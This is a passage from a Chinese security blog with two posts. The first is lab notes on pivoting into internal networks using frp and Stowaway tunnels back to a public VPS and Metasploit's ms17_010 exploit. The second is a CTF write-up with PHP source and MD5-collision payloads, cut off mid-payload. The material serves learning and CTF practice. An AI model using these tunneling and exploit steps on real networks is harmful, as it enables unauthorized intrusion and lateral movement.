href="#frp-1" class="headerlink" title="frp"></a>frp</h2><p>我们已经连接上了这台主机，我们给192.168.22.11(还有nat网卡 target1)做一个端口转发</p><p>也就是说target 针对于kali是client，针对于192.168.22.22是server</p><p>先把之前的停了，然后给target1配置端口转发</p><h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><p>server不需要修改</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure><h3 id="target1"><a href="#target1" class="headerlink" title="target1"></a>target1</h3><p>server</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><br></code></pre></td></tr></table></figure><p>client</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">47.101</span>.<span class="hljs-number">214.85</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-section">[socks5_1]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">10801</span><br><span class="hljs-attr">plugin</span> = socks5<br><br><span class="hljs-section">[socks5_to_33]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">10089</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">10090</span><br></code></pre></td></tr></table></figure><h3 id="taget2"><a href="#taget2" class="headerlink" title="taget2"></a>taget2</h3><p>client</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">22.11</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">plugin</span> = socks5<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">10089</span><br></code></pre></td></tr></table></figure><p>由于taget2需要代理，所以先开启target的client</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126140459448.png" alt="image-20240126140459448"></p><p>target1 开启Server</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>修改文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126141255288.png" alt="image-20240126141255288"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126141306069.png" alt="image-20240126141306069"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126143753337.png" alt="image-20240126143753337"></p><p>测试通过(这个是测试，所以直接使用吗，账户和密码)</p><h1 id="192-168-33-33"><a href="#192-168-33-33" class="headerlink" title="192.168.33.33"></a>192.168.33.33</h1><p>通过信息收集发现开放了445</p><p>那就使用msf  ms17_010 进行测试，由于代理很容易断掉，解决这个问题有两个办法</p><ol><li>抓紧时机</li><li>掉了重连</li></ol><p>下面是使用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">search ms17_010<br>exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_psexec<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126145023790.png" alt="image-20240126145023790"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126145219570.png" alt="image-20240126145219570"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126145241471.png" alt="image-20240126145241471"></p><p>设置代理</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">advanced</span><br></code></pre></td></tr></table></figure><p>查看高级设置</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126145514198.png" alt="image-20240126145514198"></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> proxies <span class="hljs-comment">socks5:47.101.214.85:1888</span><br># setg <span class="hljs-comment">proxies socks5:47.101.214.85:1888</span> 设置全局的代理<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126145841633.png" alt="image-20240126145841633"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126150010050.png" alt="image-20240126150010050"></p><p>获取sessions</p><p>这个三层cfs就算利用完了</p><h1 id="Stowaway-1"><a href="#Stowaway-1" class="headerlink" title="Stowaway"></a>Stowaway</h1><p>这个多级代理更加合适</p><blockquote><p><a href="https://github.com/ph4ntonn/Stowaway">ph4ntonn&#x2F;Stowaway: 👻Stowaway – Multi-hop Proxy Tool for pentesters (github.com)</a></p></blockquote><blockquote><p>  Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具  </p><p>  用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能</p></blockquote><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>admin 用法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt; ./stowaway_admin -l  &lt;port&gt; -s <span class="hljs-selector-attr">[secret]</span>  <br><br>&gt;&gt; ./stowaway_admin -c  &lt;ip:port&gt; -s <span class="hljs-selector-attr">[secret]</span>  <br><br>&gt;&gt; ./stowaway_admin -c  &lt;ip:port&gt; -s <span class="hljs-selector-attr">[secret]</span> <span class="hljs-attr">--proxy</span> &lt;ip:port&gt; <span class="hljs-attr">--proxyu</span> <span class="hljs-selector-attr">[username]</span> <span class="hljs-attr">--pro</span>  xyp <span class="hljs-selector-attr">[password]</span>  <br><br>&gt;&gt; ./stowaway_admin -c  &lt;ip:port&gt; -s <span class="hljs-selector-attr">[secret]</span> <span class="hljs-attr">--rhostreuse</span>  <br><br>&gt;&gt; ./stowaway_admin -c  &lt;ip:port&gt; -s <span class="hljs-selector-attr">[secret]</span> <span class="hljs-attr">--proxy</span> &lt;ip:port&gt; <span class="hljs-attr">--proxyu</span> <span class="hljs-selector-attr">[username]</span> <span class="hljs-attr">--proxyp</span> <span class="hljs-selector-attr">[password]</span> <span class="hljs-attr">--rhostreuse</span><br></code></pre></td></tr></table></figure><p>admin参数</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-l 被动模式下的监听地址 [ip]:&lt;port&gt;  </span><br><br><span class="hljs-deletion">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致  </span><br><br><span class="hljs-deletion">-c 主动模式下的目标节点地址  </span><br><br><span class="hljs-deletion">--proxy socks5代理服务器地址  </span><br><br><span class="hljs-deletion">--proxyu socks5代理服务器用户名(可选)  --proxyp socks5代理服务器密码(可选)  </span><br><br><span class="hljs-deletion">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></code></pre></td></tr></table></figure><p>admin 主 panel 选项：  </p><p>就是进入节点之后的选项</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">(admin) &gt;&gt; help<br>  help                                             显示帮助信息<br>  detail                                          展示在线节点的详细信息<br>  topo                                             展示在线节点的父子关系<br>  use        &lt;id&gt;                                  选择你要使用的目标节点<br>  <span class="hljs-keyword">exit</span>                                             退出 Stowaway<br></code></pre></td></tr></table></figure><p>  admin node panel 选项：  </p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pf">(node <span class="hljs-number">0</span>) &gt;&gt; help<br> help                                            显示帮助信息<br> listen                                          开始监听当前节点的端口<br> addmemo    <span class="hljs-variable">&lt;string&gt;</span>                             为当前节点添加备忘录<br> delmemo                                         删除当前节点的备忘录<br> ssh        <span class="hljs-variable">&lt;ip:port&gt;</span>                            通过当前节点启动SSH<br> shell                                           在当前节点上启动一个交互式外壳<br> socks      <span class="hljs-variable">&lt;lport&gt;</span> [username] [<span class="hljs-built_in">pass</span>]            启动一个socks5服务器<br> stopsocks                                       关闭socks服务<br> connect    <span class="hljs-variable">&lt;ip:port&gt;</span>                            连接到一个新节点<br> sshtunnel  <span class="hljs-variable">&lt;ip:sshport&gt;</span> <span class="hljs-variable">&lt;agent port&gt;</span>            使用sshtunnel将节点添加到我们的拓扑结构中<br> upload     <span class="hljs-variable">&lt;local filename&gt;</span> <span class="hljs-variable">&lt;remote filename&gt;</span>   上传文件到当前节点<br> download   <span class="hljs-variable">&lt;remote filename&gt;</span> <span class="hljs-variable">&lt;local filename&gt;</span>   从当前节点下载文件<br> forward    <span class="hljs-variable">&lt;lport&gt;</span> <span class="hljs-variable">&lt;ip:port&gt;</span>                    转发本地端口到特定的远程 ip:<span class="hljs-keyword">port</span><br> stopforward                                     关闭转发服务<br> backward    <span class="hljs-variable">&lt;rport&gt;</span> <span class="hljs-variable">&lt;lport&gt;</span>                     将远程端口(agent)后退到本地端口(admin)。<br> stopbackward                                    关闭backward服务<br> shutdown                                        终止当前节点<br> back                                            返回到父面板<br> exit                                            退出Stowaway<br></code></pre></td></tr></table></figure><h3 id="agent"><a href="#agent" class="headerlink" title="agent"></a>agent</h3><p>agent 参数</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-l 被动模式下的监听地址[ip]:&lt;port&gt;</span><br><span class="hljs-deletion">-s 节点通信加密密钥</span><br><span class="hljs-deletion">-c 主动模式下的目标节点地址</span><br><span class="hljs-deletion">--proxy socks5代理服务器地址</span><br><span class="hljs-deletion">--proxyu socks5代理服务器用户名(可选)</span><br><span class="hljs-deletion">--proxyp socks5代理服务器密码(可选)</span><br><span class="hljs-deletion">--reconnect 重连时间间隔</span><br><span class="hljs-deletion">--rehost 端口复用时复用的IP地址</span><br><span class="hljs-deletion">--report 端口复用时复用的端口号</span><br><span class="hljs-deletion">--up 上游协议类型,默认为裸TCP流量,可选HTTP</span><br><span class="hljs-deletion">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></code></pre></td></tr></table></figure><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p>server  也就是我现在的攻击机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x admin<br>./admin -l 8987 -s hack<br></code></pre></td></tr></table></figure><blockquote><p>-l  监听，也就是等待被连接，有点像反向shell</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126160036239.png" alt="image-20240126160036239"></p><p>上传agent到target1(要被这三兄弟恶心吐了….)</p><p>target1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./agent -c 192.168.79.138 -s hack<br></code></pre></td></tr></table></figure><p>admin节点发生变化</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126160743086.png" alt="image-20240126160743086"></p><p>查看所有的节点</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">topo <br><span class="hljs-keyword">use</span> <span class="hljs-number">1</span> <span class="hljs-comment"># 使用对应的节点</span><br>socks port <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126160948984.png" alt="image-20240126160948984"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126161040374.png" alt="image-20240126161040374"></p><p>然后再连着代理的情况下将agent 上传到target2</p><p>对于tartget2 -&gt; target1</p><p>有两种方法</p><ol><li>target1 监听 target2 主动连接</li><li>target2 监听 target1 主动连接</li></ol><p>方法一：</p><p> 对于已经连接agent的操作，必须在admin上操作</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126161547619.png" alt="image-20240126161547619"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126161627747.png" alt="image-20240126161627747"></p><p>来了</p><p>方法二</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126161947360.png" alt="image-20240126161947360"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126162105634.png" alt="image-20240126162105634"></p><p>这里有两个target2是因为链接了两次</p><p>开启node2的代理</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126162241274.png" alt="image-20240126162241274"></p><p>测试</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Socks%E4%BB%A3%E7%90%86/image-20240126162402382.png" alt="image-20240126162402382"></p><p>嗯….这个稳定很多很多</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单的把socks代理学了，还有很长的路要走</p><p>Socks代理感觉更加推荐stowaway，但是也有专门针对渗透测试的frp</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>total</title>
    <link href="/2024/01/23/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/total/"/>
    <url>/2024/01/23/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/total/</url>
    
    <content type="html"><![CDATA[<h1 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h1><p>0x00 记录一下我第一次遇到的较为综合的题目</p><p>使用的知识点</p><ol><li>扫描目录</li><li>md5 碰撞</li><li>sha1加密</li></ol><p>0x01</p><p>这个地方其实其实什么东西也没有有，但是我们需要利用这一关到达下面的关卡</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123151230019.png" alt="image-20240123151230019"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123151342211.png" alt="image-20240123151342211"></p><p>找到第二关</p><p>0x02</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//here is level 2</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;str.php&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array1&#x27;</span>];<br>    <span class="hljs-variable">$a2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array2&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a1</span> == <span class="hljs-variable">$a2</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;????&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level3</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;level 2 failed ...&quot;</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123151459324.png" alt="image-20240123151459324"></p><p>由于这里使用hackbar的话不太好就操作</p><p>所以使用bp进行抓包</p><p>这里是请类型；比较所以直接使用md5值的碰撞</p><blockquote><p><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">总结ctf中 MD5 绕过的一些思路_ctf md5-CSDN博客</a></p></blockquote><p>常见的一些碰撞有：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wren">$<span class="hljs-title class_">Param</span>1<span class="hljs-operator">=</span><span class="hljs-string">&quot;\x4d\xc9<span class="hljs-char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x72</span>\xd4<span class="hljs-char escape_">\x77</span>\x7b<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x15</span><span class="hljs-char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="hljs-char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="hljs-char escape_">\x78</span>\x3e\x7b<span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x18</span>\xaf\xbf\xa2<span class="hljs-char escape_">\x00</span>\xa8<span class="hljs-char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="hljs-char escape_">\x55</span>\xb3\x5f<span class="hljs-char escape_">\x42</span><span class="hljs-char escape_">\x75</span><span class="hljs-char escape_">\x93</span>\xd8<span class="hljs-char escape_">\x49</span><span class="hljs-char escape_">\x67</span>\x6d\xa0\xd1<span class="hljs-char escape_">\x55</span>\x5d<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x60</span>\xfb\x5f<span class="hljs-char escape_">\x07</span>\xfe\xa2&quot;</span>;<br>$<span class="hljs-title class_">Param</span>2<span class="hljs-operator">=</span><span class="hljs-string">&quot;\x4d\xc9<span class="hljs-char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x72</span>\xd4<span class="hljs-char escape_">\x77</span>\x7b<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x15</span><span class="hljs-char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="hljs-char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="hljs-char escape_">\x78</span>\x3e\x7b<span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x18</span>\xaf\xbf\xa2<span class="hljs-char escape_">\x02</span>\xa8<span class="hljs-char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="hljs-char escape_">\x55</span>\xb3\x5f<span class="hljs-char escape_">\x42</span><span class="hljs-char escape_">\x75</span><span class="hljs-char escape_">\x93</span>\xd8<span class="hljs-char escape_">\x49</span><span class="hljs-char escape_">\x67</span>\x6d\xa0\xd1\xd5\x5d<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x60</span>\xfb\x5f<span class="hljs-char escape_">\x07</span>\xfe\xa2&quot;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wren">$<span class="hljs-variable">data1</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;\xd1<span class="hljs-char escape_">\x31</span>\xdd<span class="hljs-char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="hljs-char escape_">\x69</span>\x3d\x9a<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="hljs-char escape_">\x07</span><span class="hljs-char escape_">\x12</span><span class="hljs-char escape_">\x46</span>\x7e\xab<span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="hljs-char escape_">\x89</span><span class="hljs-char escape_">\x55</span>\xad<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x09</span>\xf4\xb3<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x83</span>\xe4<span class="hljs-char escape_">\x88</span><span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x25</span>\xf1<span class="hljs-char escape_">\x41</span>\x5a<span class="hljs-char escape_">\x08</span><span class="hljs-char escape_">\x51</span><span 